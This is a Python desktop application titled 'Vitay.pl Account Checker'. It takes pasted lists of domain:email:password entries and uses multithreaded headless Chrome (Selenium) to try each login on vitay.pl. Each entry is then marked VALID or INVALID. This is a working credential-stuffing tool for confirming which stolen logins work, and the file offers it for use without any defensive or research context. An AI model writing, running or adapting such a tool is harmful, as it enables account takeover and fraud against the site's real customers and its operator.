import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
import queue

class AccountCheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Vitay.pl Account Checker")
        self.root.geometry("800x600")
        self.root.configure(bg='black')
        
        # Set theme colors
        self.bg_color = 'black'
        self.fg_color = 'purple'
        self.button_bg = '#4B0082'  # Indigo
        self.button_fg = 'white'
        self.entry_bg = '#222222'
        self.entry_fg = 'white'
        
        self.root.option_add('*Background', self.bg_color)
        self.root.option_add('*Foreground', self.fg_color)
        self.root.option_add('*Entry.Background', self.entry_bg)
        self.root.option_add('*Entry.Foreground', self.entry_fg)
        self.root.option_add('*Button.Background', self.button_bg)
        self.root.option_add('*Button.Foreground', self.button_fg)
        
        # Queue for thread-safe GUI updates
        self.result_queue = queue.Queue()
        
        self.create_widgets()
        self.check_queue()
        
    def create_widgets(self):
        # Title label
        title_label = tk.Label(self.root, text="Vitay.pl Account Checker", 
                              font=("Arial", 16, "bold"),
                              bg=self.bg_color, fg=self.fg_color)
        title_label.pack(pady=10)
        
# Instructions
        instructions = tk.Label(self.root, 
                               text="Enter accounts in format: domain:email:password (one per line)",
                               bg=self.bg_color, fg=self.fg_color)
        instructions.pack(pady=5)
        
        # Text area for accounts input
        self.accounts_text = scrolledtext.ScrolledText(self.root, width=90, height=10,
                                                      bg=self.entry_bg, fg=self.entry_fg,
                                                      insertbackground=self.entry_fg)
        self.accounts_text.pack(padx=10, pady=5)
        
        # Button frame
        button_frame = tk.Frame(self.root, bg=self.bg_color)
        button_frame.pack(pady=10)
        
        self.start_button = tk.Button(button_frame, text="Start Checking",
                                     command=self.start_checking,
                                     bg=self.button_bg, fg=self.button_fg,
                                     font=("Arial", 10, "bold"))
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = tk.Button(button_frame, text="Stop",
                                    command=self.stop_checking,
                                    bg=self.button_bg, fg=self.button_fg,
                                    font=("Arial", 10, "bold"),
                                    state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        # Progress label
        self.progress_label = tk.Label(self.root, text="Ready", 
                                      bg=self.bg_color, fg=self.fg_color)
        self.progress_label.pack(pady=5)
        
        # Results area
        results_label = tk.Label(self.root, text="Results:", 
                                font=("Arial", 10, "bold"),
                                bg=self.bg_color, fg=self.fg_color)
        results_label.pack(anchor=tk.W, padx=10)
        
        self.results_text = scrolledtext.ScrolledText(self.root, width=90, height=15,
                                                     bg=self.entry_bg, fg=self.entry_fg,
                                                     insertbackground=self.entry_fg)
        self.results_text.pack(padx=10, pady=5)
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Accounts checked: 0 | Valid: 0 | Invalid: 0")
        status_bar = tk.Label(self.root, textvariable=self.status_var,
                             relief=tk.SUNKEN, anchor=tk.W,
                             bg=self.bg_color, fg=self.fg_color)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Control variables
        self.running = False
        self.checked_count = 0
        self.valid_count = 0
        self.invalid_count = 0
        
    def start_checking(self):
        accounts_text = self.accounts_text.get("1.0", tk.END).strip()
        if not accounts_text:
            messagebox.showwarning("Warning", "Please enter accounts to check")
            return
            
        self.accounts = [line.strip() for line in accounts_text.split('\n') if line.strip()]
        if not self.accounts:
            messagebox.showwarning("Warning", "No valid accounts found")
            return
            
        self.running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.progress_label.config(text="Checking accounts...")
        
        # Reset counters
        self.checked_count = 0
        self.valid_count = 0
        self.invalid_count = 0
        self.update_status()
        
        # Clear results
        self.results_text.delete("1.0", tk.END)
        
        # Start worker threads
        num_threads = min(10, len(self.accounts))  # Limit concurrent threads
        for i in range(num_threads):
            thread = threading.Thread(target=self.worker, args=(i,))
            thread.daemon = True
            thread.start()
            
    def stop_checking(self):
        self.running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress_label.config(text="Stopped")
        
    def worker(self, worker_id):
        # Setup Chrome options for headless mode
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        
        driver = None
        try:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
            wait = WebDriverWait(driver, 10)
            
            while self.running:
                try:
                    # Get account from queue with timeout
                    account = self.accounts.pop(0) if self.accounts else None
                    if not account:
                        break
                        
                    # Parse account
                    parts = account.split(':')
                    if len(parts) < 3:
                        self.result_queue.put(('error', account, "Invalid format"))
                        continue
                        
                    domain, email, password = parts[0], parts[1], parts[2]
                    
                    # Attempt login
                    success = self.check_account(driver, wait, domain, email, password)
                    
                    if success:
                        self.result_queue.put(('valid', account, "Login successful"))
                        self.valid_count += 1
                    else:
                        self.result_queue.put(('invalid', account, "Login failed"))
                        self.invalid_count += 1
                    
                    self.checked_count += 1
                    self.update_status()
                    
                except IndexError:
                    break
                except Exception as e:
                    self.result_queue.put(('error', account if 'account' in locals() else 'Unknown', str(e)))
                    
        except Exception as e:
            self.result_queue.put(('error', 'Worker', f"Worker error: {str(e)}"))
        finally:
            if driver:
                driver.quit()
                
    def check_account(self, driver, wait, domain, email, password):
        try:
            # Navigate to login page - try multiple possible login URLs
            login_urls = [
                f"https://{domain}/logowanie.html",
                f"https://{domain}/customer/account/login/",
                f"https://www.vitay.pl/logowanie.html",
                "https://www.vitay.pl/logowanie.html"
            ]
            
            for url in login_urls:
                try:
                    driver.get(url)
                    # Wait for page to load
                    wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    time.sleep(1)  # Additional wait for JS
                    
                    # Try to find email/username field
                    email_selectors = [
                        (By.ID, "email"),
                        (By.NAME, "email"),
                        (By.ID, "login"),
                        (By.NAME, "login"),
                        (By.CSS_SELECTOR, "input[type='email']"),
                        (By.CSS_SELECTOR, "input[name*='email']"),
                        (By.CSS_SELECTOR, "input[name*='login']")
                    ]
                    
                    email_field = None
                    for by, selector in email_selectors:
                        try:
                            email_field = wait.until(EC.presence_of_element_located((by, selector)))
                            break
                        except TimeoutException:
                            continue
                    
                    if not email_field:
                        continue
                        
                    # Find password field
                    password_selectors = [
                        (By.ID, "password"),
                        (By.NAME, "password"),
                        (By.CSS_SELECTOR, "input[type='password']"),
                        (By.CSS_SELECTOR, "input[name*='pass']")
                    ]
                    
                    password_field = None
                    for by, selector in password_selectors:
                        try:
                            password_field = email_field.find_element(by, selector)
                            break
                        except NoSuchElementException:
                            try:
                                password_field = wait.until(EC.presence_of_element_located((by, selector)))
                                break
                            except TimeoutException:
                                continue
                    
                    if not password_field:
                        continue
                    
                    # Clear and enter credentials
                    email_field.clear()
                    email_field.send_keys(email)
                    password_field.clear()
                    password_field.send_keys(password)
                    
                    # Find and click login button
                    login_button_selectors = [
                        (By.ID, "login-button"),
                        (By.NAME, "login"),
                        (By.CSS_SELECTOR, "button[type='submit']"),
                        (By.CSS_SELECTOR, "input[type='submit']"),
                        (By.XPATH, "//button[contains(text(), 'Zaloguj') or contains(text(), 'Login')]"),
                        (By.XPATH, "//input[@value='Zaloguj' or @value='Login']")
                    ]
                    
                    login_button = None
                    for by, selector in login_button_selectors:
                        try:
                            login_button = wait.until(EC.element_to_be_clickable((by, selector)))
                            break
                        except TimeoutException:
                            continue
                    
                    if not login_button:
                        continue
                    
                    login_button.click()
                    
                    # Wait for login to complete (either success or error)
                    time.sleep(3)
                    
                    # Check if login successful by looking for indicators
                    # Common success indicators: URL change, presence of user menu, etc.
                    current_url = driver.current_url.lower()
                    page_source = driver.page_source.lower()
                    
                    # Indicators of successful login
                    success_indicators = [
                        "kontakt" in current_url or "account" in current_url,
                        "wyloguj" in page_source or "logout" in page_source,
                        "twoje konto" in page_source or "my account" in page_source,
                        "dashboard" in current_url,
                        "nieprawidłowy" not in page_source and "invalid" not in page_source
                    ]
                    
                    # Indicators of failed login
                    failure_indicators = [
                        "nieprawidłowy" in page_source or "invalid" in page_source,
                        "błąd" in page_source or "error" in page_source,
                        "zaloguj" in page_source and "login" in page_source and 
                        ("nie udało" in page_source or "failed" in page_source)
                    ]
                    
                    if any(success_indicators) and not any(failure_indicators):
                        return True
                    else:
                        return False
                        
                except TimeoutException:
                    continue
                except Exception:
                    continue
            
            return False
            
        except Exception as e:
            print(f"Error checking account: {e}")
            return False
    
    def update_status(self):
        self.status_var.set(f"Accounts checked: {self.checked_count} | Valid: {self.valid_count} | Invalid: {self.invalid_count}")
        
    def check_queue(self):
        try:
            while True:
                msg_type, account, message = self.result_queue.get_nowait()
                
                # Format result line
                if msg_type == 'valid':
                    result_line = f"[VALID] {account} - {message}\n"
                    tag = 'valid'
                elif msg_type == 'invalid':
                    result_line = f"[INVALID] {account} - {message}\n"
                    tag = 'invalid'
                else:
                    result_line = f"[ERROR] {account} - {message}\n"
                    tag = 'error'
                
                # Insert with color coding
                self.results_text.insert(tk.END, result_line)
                
                # Configure tags for colors
                self.results_text.tag_config('valid', foreground='#00FF00')  # Green
                self.results_text.tag_config('invalid', foreground='#FF0000')  # Red
                self.results_text.tag_config('error', foreground='#FFA500')   # Orange
                
                # Scroll to end
                self.results_text.see(tk.END)
                
        except queue.Empty:
            pass
        
        # If still running, check again after delay
        if self.running:
            self.root.after(100, self.check_queue)
        else:
            # When stopped, re-enable start button
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.progress_label.config(text="Checking complete")

def main():
    root = tk.Tk()
    app = AccountCheckerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()